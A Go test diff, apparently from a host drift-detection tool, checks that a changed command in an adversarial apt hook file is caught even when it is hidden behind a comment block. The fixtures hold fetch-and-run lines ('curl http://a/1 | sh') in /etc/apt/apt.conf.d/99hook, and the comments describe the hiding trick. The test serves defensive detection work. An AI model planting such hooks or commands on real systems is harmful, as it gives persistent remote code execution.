@@ -1046,3 +1046,35 @@ func TestTodaDependenciaDeLacunaFoiConferida(t *testing.T) {
 		}
 	}
 }
+
+// O drift do gatilho tem de ver o HOOK do apt, não só Trigger.Lines.
+//
+// Um apt.conf.d adversário esconde o comando atrás de um bloco /* … */ que fecha
+// depois de um #, e o parser genérico descarta a linha: em Lines fica só "/*",
+// idêntico nos dois retratos. O comando muda em AptHooks, e é AptHooks que decide
+// o que o apt executa. Se o drift lê Lines, uma troca de payload no hook passa
+// sem ruído — cego ao mesmo fato que subiu o SchemaVersion para existir.
+func TestDriftDoGatilhoVeOHookDoApt(t *testing.T) {
+	apt := func(cmd string) facts.Trigger {
+		return facts.Trigger{
+			File: "/etc/apt/apt.conf.d/99hook", Kind: "pkg_hook",
+			When:     "a cada operação do gerenciador de pacotes",
+			Lines:    []facts.TriggerLine{{N: 1, Text: "/*"}}, // idêntico nos dois
+			AptHooks: []facts.TriggerLine{{N: 2, Text: cmd}},
+		}
+	}
+	antes := &facts.Facts{Triggers: []facts.Trigger{apt("curl http://a/1 | sh")}}
+	depois := &facts.Facts{Triggers: []facts.Trigger{apt("curl http://b/2 | sh")}}
+	d := Comparar(lado(antes, tudoVisivel), lado(depois, tudoVisivel))
+
+	var achou bool
+	for _, m := range d.Mudancas {
+		if m.Tipo == "startup.trigger" && m.Kind == Mudou && m.Campo == "linhas" {
+			achou = true
+		}
+	}
+	if !achou {
+		t.Fatalf("o payload do hook mudou (a→b) e o drift não viu — está lendo "+
+			"Lines em vez de AptHooks: %+v", d.Mudancas)
+	}
+}
